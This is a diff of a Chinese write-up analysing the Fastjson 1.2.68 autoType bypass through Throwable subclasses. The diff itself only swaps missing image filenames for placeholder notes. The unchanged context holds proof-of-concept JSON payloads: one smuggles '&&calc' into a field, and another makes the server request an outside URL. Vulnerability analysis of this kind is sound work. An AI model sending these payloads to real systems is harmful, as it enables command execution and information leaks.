@@ -58,11 +58,11 @@ Fastjson 1.2.68
 反序列化时如果遇到 \@type 指定的类为 Throwable
 的子类那对应的反序列化处理类就是 ThrowableDeserializer
 
-1.jpg
+> **图片待核**：原归档在此处仅保留文件名 `1.jpg`，没有可对应的图片引用。
 
 漏洞点在 `ThrowableDeserializer#deserialze`
 
-2.jpg
+> **图片待核**：原归档在此处仅保留文件名 `2.jpg`，没有可对应的图片引用。
 
 当第二个字段的 key 也是 \@type 的时候就会取 value 当做类名做一次
 checkAutoType 检测。
@@ -87,23 +87,23 @@ checkAutoType 一般有以下几种情况会通过校验。
 
 这个漏洞实际上就是基于第四种，指定了期望类的情况。
 
-3.jpg
+> **图片待核**：原归档在此处仅保留文件名 `3.jpg`，没有可对应的图片引用。
 
 这里判断了如果期望类不为空且反序列化目标类继承自期望类就会添加到缓存
 mapping 并且返回这个 class。
 
-4.jpg
+> **图片待核**：原归档在此处仅保留文件名 `4.jpg`，没有可对应的图片引用。
 
 autotype 检测通过后就会开始实例化异常类对象。
 
 同时把 message 和 cause 传给了 ThrowableDeserializer\#createException
 处理。
 
-5.jpg
+> **图片待核**：原归档在此处仅保留文件名 `5.jpg`，没有可对应的图片引用。
 
 依次按照以下顺序进行实例化构造方法参数1类型为String.class且参数2类型为Throwable.class，如果找不到就按照参数1类型为String.class，还找不到就取无参构造方法。
 
-6.jpg
+> **图片待核**：原归档在此处仅保留文件名 `6.jpg`，没有可对应的图片引用。
 
 最后为被实例化后的异常类装配属性。
 
@@ -160,7 +160,7 @@ exception.setMsg(\"hello\")
 
     {"@type":"java.lang.Throwable", "@type":"PingException","domain":"b1ue.cn&&calc"}
 
-7.jpg
+> **图片待核**：原归档在此处仅保留文件名 `7.jpg`，没有可对应的图片引用。
 
 当然这只是用来测试的，真实情况很少有人把执行命令的方法写进异常类。
 
@@ -173,7 +173,7 @@ selenium，如果同时也使用了 fastjson ，就会存在敏感信息泄露�
 同时由于是异常类，父类的 getStackTrace()
 也会被调用，会输出当前方法栈信息，可从中看出使用了什么框架。
 
-8.jpg
+> **图片待核**：原归档在此处仅保留文件名 `8.jpg`，没有可对应的图片引用。
 
 这是反序列化`org.openqa.selenium.WebDriverException`类输出的信息。
 
@@ -216,13 +216,13 @@ QQ截图20200528144437.png
         }
     }
 
-2.png
+> **图片待核**：原归档在此处仅保留文件名 `2.png`，没有可对应的图片引用。
 
 #### poc
 
     {"@type":"java.lang.Exception","@type":"org.joychou.DatasourceException", "dataSource": {"@type": "java.net.URL", "val": "http://www.0-sec.org:8888/fastjson"}}
 
-3.png
+> **图片待核**：原归档在此处仅保留文件名 `3.png`，没有可对应的图片引用。
 
 参考了链接
 ----------
